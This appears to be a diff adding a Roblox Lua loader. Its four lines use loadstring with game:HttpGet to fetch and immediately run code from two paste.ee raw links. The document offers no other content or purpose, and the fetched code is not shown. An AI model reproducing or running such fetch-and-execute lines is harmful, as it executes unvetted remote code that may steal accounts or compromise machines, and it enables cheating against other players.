@@ -1,0 +1,4 @@
+wait("0.2")
+loadstring(game:HttpGet("https://paste.ee/r/QxwYiCSF"))()
+wait("0.2")
+loadstring(game:HttpGet("https://paste.ee/r/TFi8CioE"))()
